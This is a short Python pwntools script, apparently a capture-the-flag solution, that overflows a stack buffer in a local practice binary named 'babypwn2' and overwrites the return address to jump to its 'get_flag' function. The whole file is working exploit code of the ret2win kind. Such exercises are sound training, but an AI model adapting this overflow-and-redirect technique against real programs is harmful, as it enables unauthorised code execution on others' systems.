from pwn import *
import pwnlib.util.packing as pack

elf = ELF('./babypwn2')

p = process('./babypwn2')
#gdb.attach(p)

#p.sendlineafter(b'>> ', cyclic(1024))

addr = elf.symbols['get_flag']
offset = cyclic_find('kaaalaaa')

p.sendlineafter(b'>> ', b'A'*offset + pack.p64(addr))
p.interactive()
